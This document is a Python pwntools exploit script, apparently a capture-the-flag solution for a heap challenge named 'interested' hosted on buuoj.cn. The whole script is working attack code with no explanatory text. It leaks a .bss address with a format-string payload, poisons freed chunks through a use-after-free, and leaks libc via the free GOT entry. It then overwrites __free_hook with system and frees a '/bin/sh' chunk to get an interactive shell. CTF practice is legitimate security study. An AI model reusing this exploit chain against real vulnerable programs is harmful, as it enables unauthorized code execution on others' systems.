#coding:utf-8
from pwn import *

debug = 1
context.log_level = 'debug'


def wpCheck(r):
	r.recvuntil('to do :')
	r.send("0\n")

	r.recvuntil("# Your Code is ")
	r.recvuntil('0x')
	return r.recvuntil('\n')[:-1]
	
def wpCreate(r, size, content, re_size, re_content):
	r.recvuntil('to do :')
	r.send("1\n")

	r.recvuntil("> O's length : ")
	r.send(str(size) + '\n')

	r.recvuntil("> O : ")
	r.send(content)

	r.recvuntil("> RE's length : ")
	r.send(str(re_size) + '\n')

	r.recvuntil("> RE : ")
	r.send(re_content)

def wpMod(r, index, content, re_content):
	r.recvuntil('to do :')
	r.send("2\n")

	r.recvuntil('> Oreo ID : ')
	r.send(str(index) + "\n")

	r.recvuntil("> O : ")
	r.send(content)

	r.recvuntil("> RE : ")
	r.send(re_content)

def wpDel(r, index):
	r.recvuntil('to do :')
	r.send("3\n")

	r.recvuntil('> Oreo ID : ')
	r.send(str(index) + "\n")


def wpView(r, index):
	r.recvuntil('to do :')
	r.send("4\n")

	r.recvuntil('> Oreo ID : ')
	r.send(str(index) + "\n")

	r.recvuntil("# oreo's O is ")
	content1 = r.recvuntil('\n')[:-1]
	r.recvuntil("# oreo's RE is ")
	content2 = r.recvuntil('\n')[:-1]
	return [content1, content2]


def exp(debug):
	elf = ELF("./interested")
	if debug == 1:
		r = process("./interested")
		lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")
		#gdb.attach(r, 'b *$rebase(0x000000000001277)')
	else:
		r = remote('node3.buuoj.cn', 25405)
		lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")

	r.send("OreOOrereOOreO%7$p")
	bss = int(wpCheck(r), 16)
	re_length_array = bss + 0x30
	chunkPointer_array = bss + 0x90
	size_array = bss + 0xf0	
	rePointer_array = bss + 0x150
	log.info('s1 => %#x, re_length_array => %#x, chunkPointer_array => %#x, size_array => %#x, rePointer_array => %#x'%(bss, re_length_array, chunkPointer_array, size_array, rePointer_array))

	wpCreate(r, 0x68, 'a', 0x50, 'a')	#index:1
	wpCreate(r, 0x68, 'a', 0x50, 'a')	#index:2
	wpCreate(r, 0x68, 'a', 0x50, 'a')	#index:3
	wpCreate(r, 0x68, '/bin/sh\x00', 0x50, '/bin/sh\x00')	#index:4
	wpDel(r, 1)
	wpDel(r, 2)
	wpDel(r, 3)
	wpMod(r, 3, p64(chunkPointer_array + 0x8), 'a')
	wpCreate(r, 0x68, 'a', 0x50, 'a')	#index:5
	wpCreate(r, 0x68, p64(chunkPointer_array + 0x8), 0x50, 'a')	#index:6

	free_got = bss + 0x0000000000201F70 - 0x0000000000202050
	wpMod(r, 1, p64(chunkPointer_array + 0x8) + p64(free_got), 'a')
	
	lib_base = u64(wpView(r, 2)[0].ljust(8, '\x00')) - lib.sym['free']
	log.info('lib_base = %#x'%lib_base)

	wpMod(r, 1, p64(chunkPointer_array + 0x8) + p64(lib_base + lib.sym['__free_hook']), 'a')
	wpMod(r, 2, p64(lib_base + lib.sym['system']), 'a')
	
	wpDel(r, 4)
	r.interactive()

exp(debug)
